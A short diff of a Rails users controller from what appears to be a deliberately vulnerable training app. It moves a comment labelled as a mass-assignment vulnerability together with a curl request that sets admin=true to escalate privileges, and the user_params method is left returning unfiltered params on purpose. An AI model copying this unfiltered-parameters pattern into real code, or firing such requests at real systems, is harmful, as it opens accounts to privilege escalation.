@@ -30,11 +30,11 @@ class UsersController < ApplicationController
     end
   end
 
+  ### APPSEC Vuln 3: Mass Assignment
+  # curl -X POST 'http://127.0.0.1:3000/users?user%3D%7Bid%3D6%26email%3Dfoo%40bar.com%26password_digest%3D1%26admin%3Dtrue%26created_at%3D2025-08-27T19%3A17%3A42.430Z%26updated_at%3D2025-08-27T19%3A17%3A42.443Z%26password%3D1%26token%3D5f9914789c7d603144b323fc69ae1695%7D'
   private
 
     def user_params
-      ### APPSEC Vuln 3: Mass Assignment
-      # curl -X POST 'http://127.0.0.1:3000/users?user%3D%7Bid%3D6%26email%3Dfoo%40bar.com%26password_digest%3D1%26admin%3Dtrue%26created_at%3D2025-08-27T19%3A17%3A42.430Z%26updated_at%3D2025-08-27T19%3A17%3A42.443Z%26password%3D1%26token%3D5f9914789c7d603144b323fc69ae1695%7D'
       params[:user]
     end
 end
